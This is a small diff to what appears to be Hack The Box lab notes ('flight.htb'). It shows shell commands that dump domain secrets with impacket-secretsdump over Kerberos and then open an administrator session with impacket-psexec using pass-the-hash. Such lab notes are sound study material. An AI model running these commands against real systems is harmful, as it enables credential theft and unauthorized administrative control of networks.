@@ -121,7 +121,7 @@ minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
 ```sh
 #fix time skew first!
 impacket-secretsdump -k -no-pass g0.$DOMAIN
-impacket-psexec administrator@flight.htb -hashes $HASHES
+impacket-psexec administrator@$DOMAIN -hashes $HASHES
 ```
 
 Check with:
